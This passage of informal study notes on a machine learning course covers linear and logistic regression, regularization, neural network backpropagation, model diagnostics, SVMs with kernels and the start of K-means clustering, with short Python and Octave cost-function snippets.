^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_2 ^{(i)}$\n1 2 3  def computeCost(X, y, theta): inner = np.power(((X * theta.T) - y), 2) return np.sum(inner) / (2 * len(X))   4.3 Gradient Descent in Practice I - Feature Scaling Feature scaling:\nIf you make sure that the features are on a similar scale, then gradient descents can converge more quickly.\nIf $\\theta_1$ is larger than $\\theta_2$, the cost function will like picture on the left. And if you run gradient descent on this sort of cost function, your gradients may end up taking a long time and can oscillate back and forth and take a long time before it can finally find its way to the global minimum.\nA useful thing to do is to scale the features. If $x_1, x_2$ like on the right, the contours may look more like circles, and if you run gradient descent on a cost function like this, then gradient descent (you can show mathematically) can find a much more direct path to global minimum rather than much more complicated trajectory.\nWhen we performing feature scaling, what we often to do is get every feature into approximately range $[-1,1]$ nether too small nor too large.\nWhen performing feature scaling, sometimes people will also do what\u0026rsquo;s called mean normalization.\nPlace $x_i$ with $x_i-\\mu_i$ to make feature have approximately zero mean.\nMore general rule: replace $x_1 \u0026lt;- \\frac{(x_1-\\mu_1)}{s_1}$, $\\mu1$ is the average value of $x_1$ in the training sets, ans $s_1$ is the standard deviation of that feature. Then it will be roughly into these sorts of ranges.\n4.4 Gradient Descent in Practice II - Learning Rate See 2.6 Gradient Descent Intuition\n$\\alpha=0.01，0.03，0.1，0.3，1，3，10$\n4.5 Features and Polynomial Regression To predict the prize of the house we have two paras $h_\\theta(x)=\\theta_0+\\theta_1\\times{frontage}+\\theta_2\\times{depth}$\nif we let $x=frontage * depth=area$ then $h_\\theta(x)=\\theta_0+\\theta_1x$\nsometimes linear regression don\u0026rsquo;t fit all data, so maybe you want to fit a quadratic model like $h_\\theta(x)=\\theta_0+\\theta_1x_1+\\theta_2x_2^2$, it may be not fit well, then you can choose to use instead a cubic function line$h_\\theta(x)=\\theta_0+\\theta_1x_1+\\theta_2x_2 ^2+\\theta_3x_3 ^3$\n$h_\\theta(x)=\\theta_0+\\theta_1(size)+\\theta_2(size)^2$\n$h_\\theta(x)=\\theta_0+\\theta_1(size)+\\theta_2\\sqrt{size}$\npolynomial regression fit a polynomial, like a quadratic function or a cubic function, to your data. Be aware that you have a choice in what features to use, and by designing different features you can fit more complex functions to your data than just fitting a straight line to the data, and in particular, you can fit polynomial functions as well.\nPS: it is important to apply feature scaling if you are using gradient descent to get them into comparable ranges of values.\n4.6 Normal Equation Normal equation, which for some linear regression problems, will git us much better way to solve for the optimal value of the parameters theta.\nSo far the algorithm that we\u0026rsquo;ve been using for linear regression is gradient descent where in order to minimize the cost function $J of \\theta$, we would take this iterative algorithm that takes many steps, multiple iterations of gradient descent to converge to the global minimum. In contrast, the normal equation will give us a method to solve for theta analytically, so that rather than needing to run this iterative algorithm, we can instead just solve for the optimal value for theta all at one go, so that in basically one step you get to the optimal value right there.\nSet $\\theta=(X ^TX) ^-1X ^Ty$, this will give you the value of $\\theta$ that minimizes your cost function.\nNormal equation don\u0026rsquo;t need feature scaling, thought it is important for linear regression.\nCHOICES:\n   Gradient descent Normal equation     need to choose $\\alpha$ no need to choose $\\alpha$   need many iterations don\u0026rsquo;t need to iterate   works well even when $n$ is large need to compute$(X ^TX) ^{-1}$    inverse O(n^3), slow if $n$ is very large    4.7 Normal Equation Noninvertibility What if the matrix X transpose X is non-invertible? Some matrices do not have an inverse, we call those non-invertible matrices, singular or degenerate matrices. The issue or the problem of X transpose X being non-invertible should happen pretty rarely.\nIf X transpose X is non-invertible, there are usually two most common causes: The first cause is if somehow, in your learning problem, you have redundant features, concretely, if you try to predict housing prices and if $x_1$ is the size of house in square-feet and $x_2$ is the size of the house in square-meters(1 meter is equal to 3.28 feet), your two features are related via a linear equation, then matrix X transpose X will be non-invertible. Second thing that can cause it to be non-invertible is if you\u0026rsquo;re trying to run a learning algorithm with a lot of features. Concretely, if m is less than or equal to n.\n5. Octave Tutorial omitted\n6. Logistic Regression 6.1 Classification Logistic regression, actually a classification algorithm, has the property that the output the predictions of logistic regression are always between zero and one, and doesn\u0026rsquo;t become bigger than one or become less than zero.\n6.2 Hypothesis Representation Hypothesis representation, that is what is the function we\u0026rsquo;re going to use to represent our hypothesis when we have classification problem.\nWhen we were using linear regression, $h_\\theta(x)=\\theta^Tx$ was the form of a hypothesis. For logistic regression, I\u0026rsquo;m going to modify this a little bit and make the hypothesis $h_\\theta(x) = g(\\theta^Tx)$, where g is $g(z)=\\frac1{1+e^{-z} }$, this is called sigmoid function or logistic function(give rise to the name logistic regression)(Sigmoid function and logistic function are basically synonyms and mean the same thing. So the two terms are basically interchangeable).\n$h_\\theta(x) = \\text{estimated probability that y=1 on input x}$\n$h_\\theta(x) = P(y=1|x;\\theta)$ and $P(y=0|x;\\theta)+P(y=1|x;\\theta)=1$\n6.3 Decision Boundary If $h_\\theta(x)=g(\\theta_0+\\theta_1x_1+\\theta_2x_2)$ and let $\\theta=\\begin{bmatrix} -3 \\\\ 1 \\\\1 \\end{bmatrix}$\n$x_1+x_2\u0026gt;=3$ is decision boundary.\n1 2 3  import numpy as np def sigmoid(z): return 1 / (1 + np.exp(-z))   6.4 Cost Function J of $\\theta$ ends up being a non-convex function if we are to define it as the squared cost function. We need to come up with a different cost function that is convex and so that we can apply a great algorithm like gradient descent and be guaranteed to find a global minimum.\nHere\u0026rsquo;s a cost function that we\u0026rsquo;re going to use for logistic regression.\nThis function will penalize learning algorithm by a very large cost.\n1 2 3 4 5 6 7 8 9  import numpy as np def cost(theta, X, y): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X* theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X* theta.T))) return np.sum(first - second) / (len(X))   6.5 Simplified Cost Function and Gradient Descent Cost function can be written in a simple one line: $cost(h_\\theta(x),y)=-ylog(h_\\theta(x))-(1-y)log(1-h_\\theta(x))$\nThen the cost function would be $J(\\theta)=\\frac1m\\sum\\limits_{i=1} ^mCost(h_\\theta(x ^{(i)},y ^{(i)})=-\\frac1m\\sum\\limits_{i=1} ^m[y ^{(i)}log(h_\\theta(x ^{(i)}))+(1-y ^{(i)})log(1-h_\\theta(x ^{(i)}))]$\nThis cost function can be derived from statistics using the principle of maximum likelihood estimation, which is convex and find parameters $\\theta$ for different models efficiently.\nGiven this function, in order to fit the parameters, what we\u0026rsquo;re going to do then is try to find the parameters $\\theta$ that minimizes $j(\\theta)$.${\\underset\\theta\\min}j(\\theta)$, this will give us a set of $\\theta$. Finally if we\u0026rsquo;re given a new example with some et of features X. We can then take the thetas that we fit our training set and output our prediction as this $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$.\nThe way we are using to minimize the cost function is using gradient descent. If we want to minimize it as a function of $\\theta$. Here\u0026rsquo;s our usual template for gradient descent, where we repeatedly update each parameter by updating it as itself minus a learning rate alpha times derivative term.\n$$\n\\text{Want }min_\\theta j(\\theta):\n\\text{Repeat }\n\\theta_j:=\\theta_j-\\alpha\\frac\\partial{\\partial \\theta_j}j(\\theta)\n\\text{ Simultaneous update all }\\theta_j\n$$\nThis algorithm looks identical to linear regression! So are they different algorithm or not? What have changed is $h_\\theta(x)$, $h_\\theta(x)=\\theta^TX$ in linear regression and $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$ in logistic function. So even though the update rule looks cosmetically identical, because the definition of the hypothesis has changed, this is actually not the same thing as gradient descent for linear regression.\nFeature scaling can help gradient descent converge faster for linear regression. The idea of feature scaling also applies to gradient descent for logistic regression.\n6.6 Advanced Optimization 6.7 Multi-class Classification_ One-vs-all Turn training set into three separate binary classification problems.\n7. Regularization 7.1 The Problem of Overfitting When you apply algorithm to certain ML applications, thry can run into a problem called overfitting, that can cause them to perform very poorly.\nTry too hard to fit the training set, so that it even fails to generalize to new examples.\nHere is an instance of overfitting, and og a hypothesis having high variance and not really, and being unlikely to generalize well to new examples.\nDebugging and diagnosing\nrecognize when overfitting and also when underfitting may be occurring.\nOptions:\n   Reduce number of features.   Manually select which features keep. Model selection algorithm.    Throwing away some features also throwing away some information.\n  Regularization   Keep all the features, but reduce magnitude/values of parameters$\\theta_j$. Works well when we have a lot of features, each of which contributes a bit to predicting y.    7.2 Cost Function The idea of regularization is if we have small values for the parameters, it usually correspond to having a simpler hypothesis.\nIn example, we penalize just $\\theta_3 \\text{ and }\\theta_4$, make $\\theta_3 \\text{ and }\\theta_4$ small and gave us a simpler hypothesis.\nIt is hard to pick in advance which are the ones that are less likely to be relevant. So in regularization, what we are going to do is take our cost function, and modify the cost function to shrink all of my parameters.\n$J(\\theta)=\\frac1{2m}[\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-y ^{(i)})} ^2+\\lambda \\sum\\limits_{j=1} ^n{\\theta_j ^2}]$\n$\\lambda$ is called regularization parameter. And what lambda does, is controls a trade off between two different goals. The first goal is captured by the first term of the objective, is that we would like to fit the training set well. And the second goal is we want to keep the parameters small, and that\u0026rsquo;s captured by the second term, by the regularization objective, and by regularization term.\nWhat $\\lambda$ does is the controls the trade off between the goal of fitting the training set well and the goal of keeping the parameter small, and therefore keeping the hypothesis relatively simple to avoid overfitting.\n7.3 Regularized Linear Regression Gradient descent：\nIn regularization, we penalize the parameters $\\theta_1\\theta_2$ and so on up to $\\theta_n$, but we don\u0026rsquo;t penalize $\\theta_0$, so when we modify this algorithm for regularized linear regression, we\u0026rsquo;re going to end up treating $\\theta_0$ slightly differently.\nRepeat until​ convergence​{\n​\t$\\theta_0:={\\theta_0}-a\\frac1m\\sum\\limits_{i=1} ^m((h_\\theta(x ^{(i)})-y ^{(i)})x_0 ^{(i)})$\n​\t$\\theta_j:=\\theta_j-a[\\frac1m\\sum\\limits_{i=1} ^m(h_\\theta(x ^{(i)})-y ^{(i)})x_j ^{(i)}+\\frac\\lambda m\\theta_j]$\n​\t$for$ $j=1,2,\u0026hellip;n$\n}\nIf you group all the terms together that depending on $\\theta_j$, you can show that this update can be written equivalently as follows.\n$\\theta_j:=\\theta_j(1-a\\frac\\lambda m)-a\\frac1m\\sum\\limits_{i=1} ^m({h_\\theta}(x ^{(i)})-y ^{(i)})x_j ^{(i)}$\nSince $\\alpha$ is small and m is big, so $(1-\\alpha\\frac\\lambda m)$ is a number that a little bit less than one. That mean we\u0026rsquo;re shrinking the parameter a little bit, and then we\u0026rsquo;re performing similar update as before. Mathematically, what it\u0026rsquo;s doing is exactly gradient descent on the cost function $j \\text{ of } \\theta$ that uses the regularization term.\nNormal equation:\nIf you are using regularization, then this formula would add a matrix inside.\nThis new formula for $\\theta$ is one that will give you the global minimum of $j$ of $\\theta$.\nnon-invertibility:\nIf you have fewer examples than feature, then this matrix X transpose X will be non-invertible, or singular(degenerate).\nSo long as the regularization parameter $\\lambda$ \u0026gt;0, it is actually possible to prove that this matrix X transpose X plus parameter times this funny matrix will not be singular.\n7.4 Regularized Logistic Regression $J(\\theta)=\\frac1m\\sum\\limits_{i=1} ^m[-y ^{(i)}\\log( h_\\theta(x ^{(i)}))-(1-y ^{(i)})\\log(1-h_\\theta( x ^{(i)}) )]+\\frac{\\lambda }{2m}\\sum\\limits_{j=1} ^n\\theta_j ^2$\n1 2 3 4 5 6 7 8 9 10  import numpy as np def costReg(theta, X, y, learningRate): theta = np.matrix(theta) X = np.matrix(X) y = np.matrix(y) first = np.multiply(-y, np.log(sigmoid(X*theta.T))) second = np.multiply((1 - y), np.log(1 - sigmoid(X*theta.T))) reg = (learningRate / (2 * len(X))* np.sum(np.power(theta[:,1:theta.shape[1]],2)) return np.sum(first - second) / (len(X)) + reg   Repeat until convergence{\n$\\theta_0:=\\theta_0-a\\frac1m\\sum\\limits_{i=1} ^m((h_\\theta(x ^{(i)})-y ^{(i)})x_0 ^{(i)})$\n$\\theta_j:=\\theta_j-a[\\frac1m\\sum\\limits_{i=1} ^m(h_\\theta(x ^{(i)})-y ^{(i)})x_j ^{(i)}+\\frac{\\lambda }{m}\\theta_j]$\n$for$ $j=1,2,\u0026hellip;n$\n}\nThis cosmetically looks identical to what we had for linear regression. But of course is not the same algorithm as we had, because now the hypothesis is defined using $h_\\theta(x)=\\frac1{1+e ^{-\\theta ^Tx}}$.\n8. Neural Networks: Representation 8.1 Non-linear Hypotheses If we were try to learn a nonlinear hypothesis by including all the quadratic features, it was too large to be reasonable. So simple logistic regression together with adding in maybe the quadratic or the cubic features that\u0026rsquo;s just not a good way to learn complex nonlinear hypotheses when n is large, because you just end up with too many features.\nNeural network turns out to be a much better way to learn complex nonlinear hypotheses, even when your input feature space, even when n is large.\n8.2 Neurons and the Brain omitted\n8.3 Model Representation I 8.4 Model Representation II Forward propagation: Vectorized implementation\nThe right part of the picture looks a lot like logistic regression where what we\u0026rsquo;re doing is we\u0026rsquo;re using last node, that\u0026rsquo;s just the logistic regression unit and we\u0026rsquo;re using that to make a prediction h of x. The output $h_\\Theta(x)=g(\\Theta_0 ^{(2)}a_0 ^{(2)}+\\Theta_1 ^{(2)}a_1 ^{(2)}+\\Theta_2 ^{(2)}a_2 ^{(2)}+\\Theta_3 ^{(2)}a_3 ^{(2)})$. $a_0,a_1,a_2,a_3$ are given by three given units. This is awfully like the standard logistic regression model. But where the features fed into logistic regression are these values computed by the hidden layer. Concretely, the function mapping from layer 1 to layer 2, that is determined by some other set of parameters, theta 1.\n8.5 Examples and Intuitions I Neural networks can be used to learn complex nonlinear hypotheses.\nAND function:\nOR function:\nBy taking different set of $\\theta$, a single neurons in a neural network can be used to compute logical function.\n8.6 Examples and Intuitions II 8.7 Multiclass Classification We have 4 logistic regression classifiers, each of which is trying to recognize one of the four classes that we want to distinguish amongst.\n9. Neural Networks: Learning 9.1 Cost Function The cost function we use for the neural network is going to be a generalization of the one that we use for logistic regression.\nLogistic regression:\n$J(\\theta)=-\\frac1m[\\sum_\\limits{i=1} ^{m}y ^{(i)}\\log h_\\theta(x ^{(i)})+(1-y ^{(i)})log(1-h_\\theta(x ^{(i)}))]+\\frac\\lambda {2m}\\sum_\\limits{j=1} ^n\\theta_j ^2$\nNeural network now outputs vectors in $R_K$, where K might be equal to 1 if we have binary classification problem. $(h_\\Theta(x))_i = i^{th} \\text{ output}$. That is h of x is a K dimensional vector. The subscript i just selects out ith element of the vector that is output by the neural network.\nNeural network:\n$J(\\Theta) = -\\frac1m [ \\sum\\limits_{i=1}^m \\sum\\limits_{k=1}^k y_k^{(i)} \\log (h_\\Theta(x^{(i)})) _k + ( 1 - y_k ^{(i)} ) \\log ( 1- ( h_\\Theta ( x^{(i)} ) )_k ) ] + \\frac\\lambda {2m} \\sum\\limits_{l=1}^{L-1} \\sum\\limits_{i=1}^{s_l} \\sum\\limits_{j=1} ^{s_{l+1}} ( \\Theta_{ji} ^{(l)} ) ^2$\n9.2 Backpropagation Algorithm What we\u0026rsquo;d like to do is try to find parameters $\\theta$ to try to minimize $J(\\theta)$.\nThis is our vectorized implementation of forward propagation and allows us compute thee activation values for all the neurons in our neural network.\nNext, in order to compute the derivatives, we\u0026rsquo;re going to use an algorithm called back propagation. The intuition of the back propagation algorithm is that for each node we\u0026rsquo;re going to compute the term $\\delta ^{(l)}_j$ that\u0026rsquo;s going to somehow represent the \u0026ldquo;error\u0026rdquo; of node j in the layer l.\nRecall $a ^{(l)}_j$ does the activation of the j of unit in layer l. So this $\\delta$ term is in some sense going to capture our error in the activation of that neural.\n$\\delta ^{(4)}_j=a ^{(4)}_j-y_j$.\nIf you think of $\\delta$$\\alpha$ and y as vectors then you can take those and come up with a vectorized implementation of it.\n$\\delta ^{(4)}=a ^{(4)}-y$ Here, each of these is a vector whose dimension is equal to the number of output units in out network.\nSo we now got $\\delta ^{(4)}$. What we do next is compute the delta terms for the earlier layers in our network.\nHere\u0026rsquo;s a formula for computing $\\delta(3)$ , $\\delta^{(3)} = (\\Theta ^ {(3)}) ^T\\delta ^{(4)}\\ast g'(z ^ {(3)})$. The term g prime of z3, that formally is actually the derivative of the activation function g evaluated at the inputs given by z3. You can get $g'(z ^{(3)}) = a ^{(3)}\\ast (1-a ^{(3)})$ if put z3 in sigmoid function.\n$\\delta^{(2)} = (\\Theta ^ {(2)}) ^T\\delta ^{(3)}\\ast g'(z ^ {(2)})$ $g'(z ^{(2)}) = a ^{(2)}\\ast (1-a ^{(2)})$\nAnd there is no delta 1 term, because the first layer corresponds to the input layer and that\u0026rsquo;s just the feature we observed in our training sets, so that doesn\u0026rsquo;t have any error associated with that.\nThe name back propagation comes from the fact that we start by computing the delta term for the output layer and then we go back a layer and compute the delta terms for the third hidden layer and then we go back another step to compute $\\delta(2)$ and so, we\u0026rsquo;re sort of back propagating the errors from the output layer to layer 3 to layer 2.\nIgnoring lambda or alternatively the regularization term lambda will equal to 0 $\\frac{\\partial}{\\partial\\Theta_{ij} ^{(l)}}J(\\Theta)=a_{j} ^{(l)} \\delta_{i} ^{l+1}$\nSuppose we have a training set of m examples. The first thing we\u0026rsquo;re going to do is to set these $\\delta ^{(l)}_{ij}$. Triangular symbol is the capital Greek alphabet delta. $\\Delta ^{(l)}_{ij}$.\nThe delta is to be used as accumulators that will slowly add things in order to compute these partial derivatives.\nNext we\u0026rsquo;re going to loop through our training set. For the ith iteration, we\u0026rsquo;re going to working with the training example $(x ^{(i)},y ^{(i)})$.\nSet $a ^{(1)} = x ^{(i)}$ and perform forward propagation to compute the activations for all layer $a ^{(l)} l=2,3,\u0026hellip;,L$.\nNext we\u0026rsquo;re going to use output label $y ^{(i)}$ to compute the term for $\\delta ^{(L)}$ for the output there. $\\delta ^{(i)} = a ^{(L)}-y ^{(i)}$.\nThen we\u0026rsquo;re going to use the back propagation algorithm to compute $\\delta ^{(L-1)},\\delta ^{(L-2)},\u0026hellip;,\\delta ^{(2)}$. No delta 1 because we don\u0026rsquo;t associate an error term with the input layer.\n9.3 Backpropagation Intuition Forward propagation:\nBack propagation:\nOne useful intuition is that back propagation is computing these $\\delta ^{(l)}_j$ and we can think of these as the call error of the activation value.\n9.4 Implementation Note Unrolling Parameters Use back propagation to compute the derivatives of your cost function.\nOne implementation detail of unrolling parameters from matrices into vectors. Then you can pass this to an advanced authorization algorithm like fminunc for getting our for a gradient there.\n1 2 3 4  function[jVal,gradient] = costFunction(theta) # gradient-\u0026gt;R^(n+1) theta-\u0026gt;R^(n+1) initialTheta-\u0026gt;R^(n+1) vectors ... optTheta = fminunc(@costFunction, initialTheta, options)   9.5 Gradient Checking When $\\Theta$ is real number\nWhen $\\Theta$ is a vector parameter\nThe top partial derivative of the cost function with respect to every parameter in our network. And we can then take the gradient that we got from back prop.\nCheck that $gradApprox\\approx DVec$ If so, that implementation of back prop is correct.\nThe numerical gradient checking code is a very computationally expensive, a very slow way to try to approximate the derivative. Whereas in contrast, back propagation algorithm is much more computationally efficient way of computing the derivatives. Once you\u0026rsquo;ve verified your implementation of back propagation is corrct, you should turn off gradient checking\n9.6 Random Initialization If set zeros, after each update, $\\Theta$ will always be same. The way to solve is to use random initialization.\n9.7 Putting It Together  Pick a network architecture(connectivity pattern between the neurons)  Reasonable default 1 hidden layer. The more hidden units in each layer the better(slow)    Training a neural network\n Randomly initialize weights Implement forward propagation to get $h_\\Theta(x ^{(i)})$ for any $x ^{(i)}$ Implement code to compute cost function $J(\\Theta)$ Implement backprop to compute all partial derivatives Use gradient checking to compare partial derivatives computed using backpropagation and numerical estimate of gradient of $J(\\Theta)$. Use gradient descent or advanced optimization method with backpropagation to try minimize $J(\\Theta)$ as a function of parameters $\\Theta$.  9.8 Autonomous Driving 10. Advice for Applying Machine Learning 10.1 Deciding What to Try Next When you test your hypothesis on a new set of houses, you find that it makes unacceptably large errors in its predictions. What should you try next?\n Get more training examples Try smaller sets of features Try getting additional features Try adding polynomial features($x ^2_1,x ^2_2,x_1x_2,etc.$) Try decreasing $\\lambda$ Try increasing $\\lambda$  In the next two videos after this, I\u0026rsquo;m going to first talk about how to evaluate learning algorithms.\nIn the next two videos after that, I\u0026rsquo;m going to talk about these techniques which are called the machine learning diagnostics.(A test that you can run to gain insight what is/isn’t working with a learning algorithm, and gain guidance as to how best to improve its performance.)\n10.2 Evaluating a Hypothesis The standard way to evaluate a learned hypothesis is as follows.\nSplit the dataset into training set and test set.\n  Typical procedure for how you would train and test the learning algorithm maybe linear regression.\n First, Learn parameter $\\Theta$ from training data(minimizing training error $J(\\Theta)$) Compute test set error.    Training/testing procedure for logistic regression\n Learn parameter $\\Theta$ for logistic regression Compute test error. Misclassification error (0/1 misclassification error)    10.3 Model Selection and Train Validation Test Sets We will see what \u0026ldquo;Switch data into train, validation and test sets. \u0026quot; are and how to use them to do model selection.\nModel selection: choose a degree of polynomial and fit that model and also get some estimate of how well your fitted hypothesis was generalize to new examples.\nGo over and get all parameters $\\Theta ^1\\Theta ^2\u0026hellip;\\Theta ^{10}$ , look at cross validation set error, see which model has the lowest cross validation set error.\nInstead of using the test set to select the model, we\u0026rsquo;re instead going to use the validation set, or the cross validation set, to select the model.\nUse the test set to measure or to estimate the generalization error of the model that was selected by the algorithm.\n10.4 Diagnosing Bias vs. Variance underfitting problem or an overfitting problem.\nBias(underfit): training error high cross validation error high\nVariance(overfit): training error low cross validation error high\n10.5 Regularization and Bias/Variance How does regularization affect the bias ans variance of a learning algorithm?\nHow can we automatically choose a good value for the regularization parameter $\\lambda$?\nLike in model selection\n choose different $\\lambda$ minimize the cost function and get parameters vector $\\Theta$ use cross validation set to evaluate them choose the lowest error look at how well it does on the test set  You can plot $J_{train}(\\Theta)$ and $J_{cv}(\\Theta)$. When $\\lambda$ is small it would be overfiting(variance), when $\\lambda$ is large it would be lessfiting(bias).\n10.6 Learning Curves Learning curve is a useful tool that can use to diagnose if a physical learning algorithm may be suffering from bias, variance problem or a bit of both.\nHigh bias: If a learning algorithm is suffering from high bias, getting more training data will not(by itself) help much.\nHigh variance: If a learning algorithm is suffering from high variance, getting more training data is likely to help.\nPlotting learning curves like these can often help you figure out if your learning algorithm is suffering bias, or variance or even a little bit of both.\n10.7 Deciding What to Do Next (Revisited) Our original example:\n Get more training examples——help to fix high variance Try smaller sets of features——help to fix high variance Try getting additional features——fix high bias problems Try adding polynomial features($x ^2_1,x ^2_2,x_1x_2,etc.$)——fix high bias problems Try decreasing $\\lambda$——fix high bias Try increasing $\\lambda$——fix high variance  \u0026ldquo;small\u0026rdquo; neural network has few parameters and more likely to underfitting, the advantage of these small neural networks is that they are computationally cheaper.\n\u0026ldquo;large\u0026rdquo; neural network with either more hidden units(a lot hidden unit in one layer) or with more hidden layers tend to have more parameters and therefore be more prone to overfitting. You can use regularization to address overfitting.\n11. Machine Learning System Design 11.1 prioritizing what to work on: Spam classification example In order to apply supervised learning, the first decision we must make is how do we want to represent x, that is the features of the email.\nIn practice, take most frequently occurring words ( 10,000 to 50,000) in training set, rather than manually pick 100 words.\nSpend your time to make it have low error\n  Collect lots of data\n E.g. “honeypot” project.    Develop sophisticated features based on email routing information (from email header).\n  Develop sophisticated features for message body, e.g. should “discount” and “discounts” be treated as the same word? How about “deal” and “Dealer”? Features about punctuation?\n  Develop sophisticated algorithm to detect misspellings (e.g. m0rtgage, med1cine, w4tches.)\n  11.2 Error Analysis 11.3 Error Metrics for Skewed Classes If the number of positive examples is much smaller than the number of negative examples, we call it the case of skewed classes.\nFacing this problem, we want to come up with a different error metric or a different evaluation metric. One such evaluation metric are what\u0026rsquo;s called precision/recall.\n    1 0 ←Actual clss     1 True Positive(TP) False Positive(FP) Precision   0 False Negative(FN) True Negative(TN)    ↑Predicted class Recall      precision: TP/predicted positives = TP/(TP+FP)\nrecall: TP/actual positives = TP/(TP+FN)\n11.4 Trading Off Precision and Recall For many applications, we\u0026rsquo;ll want to somehow control the trade off between precision and recall.\nIf you predict y=1 only if very confident by increase threshold, there will be higher precision and lower recall\nIf you avoid missing too many cases of cancer(FN) by decreasing threshold, there will be higher recall and lower precision\nAverage: $\\frac{P+R}2$ is not a good method to evaluate\nFscore: $2\\frac{PR}{P+R}$ is a better way\n11.5 Data For Machine Learning 12. Support Vector Machines SVM, compared with LR and NN, sometimes gives a cleaner and more powerful way of learning complex nonlinear functions.\n12.1 Optimization Objective replace(simplify) the cost function of LR and make it easier to calculate\nCost function:\nFinally unlike LR, the SVM doesn\u0026rsquo;t output the probability. Instead what we have is this cost function, which we minimize to get parameters $\\theta$. And what SVM does is just makes a prediction of y being equal 1 or 0 directly.\n12.2 Large Margin Intuition Cost function:\nif y=1, we want $\\Theta^Tx\u0026gt;=1$(not just \u0026gt;= 0)\nif y=0, we want $\\Theta^Tx\u0026lt;=-1$(not just \u0026lt; 0)\nThis builds in an extra safety factor or safety margin factor into the SVM.\nLet\u0026rsquo;s see what happens or what the consequences of this are in the context of the SVM.\nIf C is very large, what we need to do is make first term equal to 0.\nIt turns out that when you solve this optimization problem, when you minimize this as a function of the parameters $\\Theta$, you get a very interesting decision boundary.\nIn linearly separable case, the black line is a much better decision boundary than others. mathematically, this line has large distance. That distance is called the margin.\nC like $\\lambda$\nIf C is very large the decision boundary will be sensible to few outliers.\nIf C is not too large, SVM also do fine and reasonable things even your data is not linearly separable.\n12.3 Mathematics Behind Large Margin Classification(optional) Math behind large margin classification\n$u = \\begin{bmatrix}u_1 \\\\ u_2\\end{bmatrix} v=\\begin{bmatrix}v_1 \\\\ v_2\\end{bmatrix}$\nInner product = $u^Tv = u_1v_1+u_2v_2$\n$|u| = \\sqrt{u ^2_1+u ^2_2}$\nOptimization objective = $\\frac12(\\Theta ^2_1+\\Theta ^2_2) = \\frac12(\\sqrt{\\Theta ^2_1+\\Theta ^2_2}) ^2 = \\frac12|\\Theta| ^2$\ns.t. $\\Theta ^Tx ^{(i)}\u0026gt;=1$ if $y ^{(i)}=1$\n$\\Theta ^Tx ^{(i)}\u0026lt;=-1$ if $y ^{(i)}=0$\nso $\\Theta ^Tx ^{(i)} = \\Theta_1x ^{i}_1+\\Theta_2x ^{(i)}_2$\nThe decision boundary and parameters $\\Theta$ are 90 degree orthogonal, we need a small range of parameters $\\Theta$, that mean only when $p^{(i)}$ is big not small, that meet the condition $p^{(i)}\\cdot{\\left| \\theta \\right|}$ \u0026gt;= 1 or \u0026lt;= -1 since $|\\Theta|$ is always positive.\nThe magnitude of the margin is exactly the values of $p ^{(1)}p ^{(2)}p ^{(3)}$ and so on. By making the margin large, SVM can end up with a smaller value for the norm of $\\Theta$, which is what it is trying to do in the objective. And this is why SVM ends up with a large margin classifiers, because it is trying to maximize the norm of these $p ^{(i)}$ which is the distance from the training examples to the decision boundary.\n12.4 Kernels I $f_1=similarity(x,l ^{(1)})=e(-\\frac{|x-l ^{(1)}| ^2}{2\\sigma ^2})$\n$f_2=similarity(x,l ^{(2)})=e(-\\frac{|x-l ^{(2)}| ^2}{2\\sigma ^2})$\n$f_3=similarity(x,l ^{(3)})=e(-\\frac{|x-l ^{(3)}| ^2}{2\\sigma ^2})$\nThese particular choice of similarity function is called Gaussian kernel. But the way the terminology goes is that, in the abstract these different similarity functions are called kernels and we can have different similarity functions and the specific example I\u0026rsquo;m giving here is called Gaussian kernel.\n$If x\\approx l ^{(1)} Then f_1 \\approx e ^{-0} \\approx 1$\nIf x is far from $l ^{(1)}$ Then $f_1=e ^{\\text{-large number} } \\approx 0$\nWe predict 1 when $θ_0+θ_1f_1+θ_2f_2+θ_1f_3\u0026gt;=0$\nLet $\\Theta_0=-0.5 \\Theta_1=\\Theta_2=1 \\Theta_3=0$, and we can judge whether the point positive or not.\nFor the purple point $f1=1 f2=0 f3=0$ so $θ_0+θ_1f_1+θ_2f_2+θ_1f_3 = -0.5+1 = 0.5 \u0026gt; 0$ . So this point is positive.\nThis is how with the definition of the landmarks and of the kernel function we can learn pretty complex non-linear decision boundary.\n12.5 Kernels II Throw in some of the missing details and also, say a few words about how to use these ideas in practice. Such as, how to pertain to the bias variance trade-off in SVM.\nWhere to get landmarks $l ^{(1)}l ^{(2)}l ^{(3)}$? The idea here is we\u0026rsquo;re gonna take the examples and for every training example, we are just put landmarks as exactly the same locations as the training examples.\nGiven an example x we are going to compute features as $f_1 f_2$ and so on. And these then give me a feature vector. $f = \\begin{bmatrix}f_1 \\\\ f_2 \\\\ \u0026hellip; \\\\ f_m \\end{bmatrix}$ By convention, we can add an $f_0=1$\nHow to choose SVM parameters?:\nC(=$\\frac1\\lambda$) Large C: Lower bias, high variance.\nSmall C: Higher bias, low variance.\n$\\sigma ^2$ in Gaussian kernel: Large $\\sigma ^2$, features f vary more smoothly, higher bias, lower variance.\nSmall $\\sigma ^2$: features f vary less smoothly. lower bias, higher variance.\n12.6 Using An SVM kernel:\n No kernel(\u0026ldquo;linear kernel\u0026rdquo;) predict \u0026ldquo;y=1\u0026rdquo; if $\\Theta ^Tx\u0026gt;=0$(when n large and m small) Gaussian kernel(when n small m large non-linear boundary) [Note: Do perform feature scaling before using Gaussian kernel]  Polynomial Kernel String kernel chi-square kernel histogram intersection kernel    Multiclass classification:\nMany SVM packages already have built-in multi-class classification functionality.\nOtherwise, use one-vs.-all method. (Train K SVMs, one to distinguish y=i from the rest, for i=1,2\u0026hellip;k), get $\\Theta ^{(1)}\\Theta ^{(2)}\u0026hellip;\\Theta ^{(K)}$ Pick class i with largest ${\\Theta ^{(i)}} ^Tx$.\nLR vs. SVM:\nIf n is large(relative to m) use LR or SVM without a kernel(\u0026ldquo;linear kernel\u0026rdquo;)\nIf n is small, m is intermediate: use SVM with Gaussian kernel\nIf n is small, m is large: create/add more features, then use LR or SVM without a kernel\nNeural network likely to work well for most if these settings, but may be slower to train.\n13. Clustering 13.1 Unsupervised Learning——Introduction Our first unsupervised learning where we learn unlabeled data instead of labeled data.\n13.2 K-Means Algorithm K-Means Algorithm by far the most popular most widely used clustering algorithm.\nInput:\n K(number of clusters) Training Set{$x ^{(1)} x ^{(2)},\u0026hellip;x 